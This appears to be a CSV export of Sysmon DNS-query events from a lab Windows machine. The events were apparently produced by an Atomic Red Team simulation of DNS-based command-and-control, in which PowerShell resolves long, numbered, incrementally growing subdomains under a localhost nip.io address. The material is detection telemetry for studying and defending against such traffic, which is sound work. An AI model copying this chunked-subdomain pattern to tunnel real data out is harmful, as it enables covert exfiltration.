"2025-12-26 11:29:53.906 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175249,"Query: 057.atomicredteamatomicredteamatom.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:53.265","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:53.906 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175250,"Query: 058.atomicredteamatomicredteamatomi.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:53.304","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:53.906 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175251,"Query: 059.atomicredteamatomicredteamatomic.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:53.343","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:53.906 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175252,"Query: 060.atomicredteamatomicredteamatomicr.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:53.381","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:53.906 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175253,"Query: 061.atomicredteamatomicredteamatomicre.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:53.419","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:53.906 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175254,"Query: 062.atomicredteamatomicredteamatomicred.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:53.456","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:53.906 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175255,"Query: 063.atomicredteamatomicredteamatomicredt.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:53.497","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:53.906 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175256,"Query: 064.atomicredteamatomicredteamatomicredte.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:53.534","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:53.906 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175257,"Query: 065.atomicredteamatomicredteamatomicredtea.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:53.572","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:53.906 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175258,"Query: 066.atomicredteamatomicredteamatomicredteam.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:53.611","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:53.906 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175259,"Query: 067.atomicredteamatomicredteamatomicredteama.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:53.648","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:53.906 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175260,"Query: 068.atomicredteamatomicredteamatomicredteamat.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:53.685","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:53.906 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175261,"Query: 069.atomicredteamatomicredteamatomicredteamato.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:53.723","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:53.906 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175262,"Query: 070.atomicredteamatomicredteamatomicredteamatom.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:53.765","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:54.920 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175264,"Query: 071.atomicredteamatomicredteamatomicredteamatomi.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:53.804","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:54.920 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175265,"Query: 072.atomicredteamatomicredteamatomicredteamatomic.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:53.842","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:54.920 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175266,"Query: 073.atomicredteamatomicredteamatomicredteamatomicr.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:54.022","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:54.920 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175267,"Query: 074.atomicredteamatomicredteamatomicredteamatomicre.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:54.062","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:54.920 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175268,"Query: 075.atomicredteamatomicredteamatomicredteamatomicred.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:54.100","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:54.920 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175269,"Query: 076.atomicredteamatomicredteamatomicredteamatomicredt.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:54.139","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:54.920 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175270,"Query: 077.atomicredteamatomicredteamatomicredteamatomicredte.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:54.178","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:54.920 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175271,"Query: 078.atomicredteamatomicredteamatomicredteamatomicredtea.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:54.216","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:54.920 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175272,"Query: 079.atomicredteamatomicredteamatomicredteamatomicredteam.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:54.253","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:54.920 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175273,"Query: 080.atomicredteamatomicredteamatomicredteamatomicredteama.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:54.425","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:54.920 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175274,"Query: 081.atomicredteamatomicredteamatomicredteamatomicredteamat.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:54.463","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:54.920 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175275,"Query: 082.atomicredteamatomicredteamatomicredteamatomicredteamato.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:54.503","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:54.920 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175276,"Query: 083.atomicredteamatomicredteamatomicredteamatomicredteamatom.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:54.541","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:54.920 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175277,"Query: 084.atomicredteamatomicredteamatomicredteamatomicredteamatomi.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:54.578","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:54.920 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175278,"Query: 085.atomicredteamatomicredteamatomicredteamatomicredteamatomic.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:54.616","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:54.920 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175279,"Query: 086.atomicredteamatomicredteamatomicredteamatomicredteamatomicr.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:54.786","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:54.920 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175280,"Query: 087.atomicredteamatomicredteamatomicredteamatomicredteamatomicre.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:54.823","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:54.921 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175281,"Query: 088.atomicredteamatomicredteamatomicredteamatomicredteamatomicred.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:54.862","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:55.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175282,"Query: 089.atomicredteamatomicredteamatomicredteamatomicredteamatomicredt.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:54.900","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:55.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175283,"Query: 090.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:54.939","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:55.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175284,"Query: 091.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.at.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:54.976","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:55.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175285,"Query: 092.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.ato.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:55.013","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:55.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175286,"Query: 093.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atom.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:55.051","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:55.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175287,"Query: 094.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomi.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:55.101","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:55.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175288,"Query: 095.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomic.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:55.140","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:55.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175289,"Query: 096.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicr.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:55.177","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:55.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175290,"Query: 097.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicre.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:55.216","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:55.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175291,"Query: 098.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicred.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:55.257","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:55.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175292,"Query: 099.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredt.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:55.295","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:55.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175293,"Query: 100.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredte.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:55.334","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:55.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175294,"Query: 101.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredtea.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:55.373","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
